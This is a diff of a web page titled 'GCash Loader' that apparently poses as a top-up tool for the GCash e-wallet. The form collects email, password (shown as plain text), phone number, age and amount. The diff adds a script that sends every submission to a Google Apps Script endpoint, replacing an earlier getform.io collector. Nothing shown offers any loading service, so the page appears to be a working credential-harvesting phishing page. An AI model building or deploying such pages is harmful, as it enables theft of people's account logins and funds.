@@ -1,32 +1,48 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>GCash Loader</title>
     <link rel="stylesheet" href="styles.css">
 </head>
+
 <body>
     <div class="form-container">
         <h1>GCash Loader</h1>
-        <form action="https://getform.io/f/azylqzmb" method="POST">
-            <label for="email">Email:</label>
-            <input type="email" id="email" name="email" required>
+        <form method="POST" name="google-sheet">
 
-            <label for="text">Password:</label>
-            <input type="password" id="password" required>
-            
-            <label for="age">Confirm Password:</label>
-            <input type="text" required>
-            
-            <label for="phone">Phone Number:</label>
-            <input type="tel" id="phone" name="phone" required>
-            
+            <label>Email:</label>
+            <input type="email" name="email" required>
+
+            <label>Password:</label>
+            <input type="text" name="Password" required>
+
+            <label>Phone Number:</label>
+            <input type="tel" name="Phone" required>
+
+            <label for="age">Age:</label>
+            <input type="number" name="age" required>
+
             <label for="amount">Amount:</label>
-            <input type="number" id="amount" name="amount" required>
+            <input type="number" name="amount" required>
 
-            <button type="submit">Submit</button>
+            <button name="submit" type="submit">Submit</button>
         </form>
     </div>
 </body>
+
+<script>
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbyLFSDgU5JEuYAylG0dQQKikisjvdQn8BTgGjIHbxgQcSdRHVlyW1kV8ahclvX4irFa/exec'
+    const form = document.forms['google-sheet']
+
+    form.addEventListener('submit', e => {
+        e.preventDefault()
+        fetch(scriptURL, { method: 'POST', body: new FormData(form) })
+            .then(response => alert("Thanks for Submitting the for!!!"))
+            .catch(error => console.error('Error!', error.message))
+    })
+</script>
+
 </html>
